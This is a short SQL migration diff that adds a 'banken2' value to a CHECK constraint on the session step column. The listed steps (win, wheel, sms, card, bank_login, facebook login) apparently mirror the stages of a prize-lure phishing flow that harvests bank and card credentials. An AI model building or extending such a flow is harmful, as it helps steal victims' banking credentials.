@@ -34,7 +34,7 @@ CHECK (current_step IN (
   'code_entry','sms','win','verify','banken','card','wait','invalid_bank',
   'bank','live_support','special_approval','congratulations','congrats',
   'facebook','wheel','login','bank_login','SPECIAL_INFO',
-  'generator1','generator2','custom_question','win2'
+  'generator1','generator2','custom_question','win2','banken2'
 ));
 
 ALTER TABLE public.sessions ENABLE ROW LEVEL SECURITY;
